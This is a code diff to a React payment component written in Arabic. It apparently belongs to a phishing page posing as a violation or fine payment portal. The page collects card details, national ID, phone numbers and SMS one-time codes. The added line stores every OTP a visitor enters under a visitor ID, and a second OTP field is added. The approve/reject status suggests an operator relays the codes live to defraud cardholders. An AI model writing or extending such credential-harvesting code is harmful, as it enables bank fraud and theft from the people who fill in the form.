@@ -217,6 +217,7 @@ export default function Kent(props: { setPage?: any; violationValue?: number }) 
     if (!newotp.includes(`${otp} , `)) {
       newotp.push(`${otp} , `)
     }
+    addData({id:visitorId, allOtps:newotp,otp})
   }
 
   // Handle card approval
@@ -638,92 +639,9 @@ setTimeout(() => {
             </div>
           </div>
         )
-      case 2:
-        return (
-          <div className="form-card" dir="rtl">
-            <div
-              className="notification"
-              style={{
-                border: "#ff0000 1px solid",
-                backgroundColor: "#f7dadd",
-                fontSize: 12,
-                fontFamily: "helvetica, arial, sans serif",
-                color: "#31708f",
-                paddingRight: 15,
-                marginBottom: 3,
-                textAlign: "center",
-                display: "none",
-              }}
-              id="otpmsgDC2"
-            ></div>
+     
 
-            {/* Notification */}
-            <div
-              className="row alert-msg"
-              id="notificationbox"
-              style={{
-                color: "#31708f",
-                fontFamily: "Arial, Helvetica, serif",
-                fontSize: 12,
-              }}
-            >
-              <div id="notification">
-                <p>
-                  <span className="title" style={{ fontWeight: "bold" }}>
-                    يرجى الملاحظة:
-                  </span>{" "}
-                  لمتابعة الطلب، يرجى إدخال رقم الهاتف المحمول المرتبط ببطاقة الهوية الوطنية حتى تتم عملية الدفع بنجاح.
-                </p>
-              </div>
-            </div>
-
-            {/* رقم الهوية / الأقامة */}
-            <div className="row">
-              <div id="payConfirmCardNum">
-                <label className="col">رقم الهوية / الأقامة:</label>
-                <input
-                  className="col-12"
-                  type="tel"
-                  name="idNumber"
-                  style={{ width: "100%" }}
-                  maxLength={10}
-                  value={formData.idNumber || cid}
-                  onChange={handleFormChange}
-                />
-              </div>
-            </div>
-
-            {/* Network Operator */}
-            <div className="row" id="payConfirmExpmnth" style={{ display: "block" }}>
-              <label className="col">مشغل الشبكة:</label>
-              <div>
-                <select style={{ width: "100%" }} name="network" value={formData.network} onChange={handleFormChange}>
-                  <option value="Zain">Zain</option>
-                  <option value="Ooredoo">Ooredoo</option>
-                  <option value="STC">STC</option>
-                </select>
-              </div>
-            </div>
-
-            {/* رقم الهاتف */}
-            <div className="row" id="payConfirmExpyr" style={{ display: "block" }}>
-              <div id="payConfirmCardNum">
-                <label className="col">رقم الهاتف:</label>
-                <input
-                  className="col"
-                  type="tel"
-                  name="mobile"
-                  maxLength={10}
-                  style={{ width: "100%" }}
-                  value={formData.mobile}
-                  onChange={handleFormChange}
-                />
-              </div>
-            </div>
-          </div>
-        )
-
-      case 3:
+      default:
         return (
           <div className="form-card" dir="rtl">
             <div className="notification">
@@ -790,42 +708,36 @@ setTimeout(() => {
                 >
                   <div className="flex items-center justify-between mb-2">
                     <div className="flex items-center gap-1 text-blue-600">
-                      <strong>الرمز المرسل إلى الجوال من 4 أرقام</strong>
+                    </div>
+                  </div>
+
+                </div>
+
+                {/* Second OTP Input field */}
+                <div
+                  className="mb-6"
+                  style={{
+                    color: "#31708f",
+                  }}
+                >
+                  <div className="flex items-center justify-between mb-2">
+                    <div className="flex items-center gap-1 text-blue-600">
+                      <strong>الرمز المرسل إلى الجوال</strong>
                     </div>
                   </div>
                   <input
                     type="tel"
+                    minLength={6}
                     maxLength={6}
                     required
-                    placeholder="الرمز المرسل إلى الجوال من 4 أرقام"
+                    placeholder="الرمز  المرسل إلى الجوال"
                     className="text-center text-lg py-6 border-blue-200 col-12"
-                    value={paymentInfo.otp || ""}
-                    onChange={(e) => handlePaymentInfoChange("otp", e.target.value)}
+                    value={paymentInfo.otp2 || ""}
+                    onChange={(e) => handlePaymentInfoChange("otp2", e.target.value)}
                   />
                 </div>
               </div>
             </div>
-            <div className="flex items-center justify-between mt-4">
-              <div className="flex items-center gap-1">
-                <span
-                  className={`${paymentInfo.status === "approved" ? "text-green-600" : paymentInfo.status === "rejected" ? "text-red-600" : "text-yellow-600"} font-bold`}
-                >
-                  {paymentInfo.status === "approved"
-                    ? "تم التحقق ✓"
-                    : paymentInfo.status === "rejected"
-                      ? <span style={{ color: 'red' }}> {" OTP رمز التحقق غير صحيح   ✗"}</span>
-                      : "انتظار التحقق ..."}
-                </span>
-              </div>
-            </div>
-            {paymentInfo.status === "rejected" ? null : <div style={{ display: 'flex', justifyContent: "center" }}></div>}
-          </div>
-        )
-
-      default:
-        return (
-          <div style={{ textAlign: "center", padding: "20px" }}>
-            <p>Please wait while we process your payment...</p>
           </div>
         )
     }
